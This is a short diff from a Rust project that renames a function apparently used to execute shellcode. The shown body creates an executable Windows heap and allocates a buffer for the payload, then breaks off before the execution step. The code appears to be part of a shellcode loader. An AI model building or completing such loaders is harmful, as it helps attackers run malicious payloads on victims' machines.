@@ -5,7 +5,7 @@ use winapi::um::heapapi::HeapAlloc;
 use winapi::um::heapapi::HeapCreate;
 
 // 执行器
-pub(crate) fn execute_shellcode(shellcode: Vec<u8>) {
+pub(crate) fn heapapi_healdlloc_execute_shellcode(shellcode: Vec<u8>) {
     unsafe {
         let heap = HeapCreate(0x40000, 0, 0);
         let ptr = HeapAlloc(heap, 8, shellcode.len());
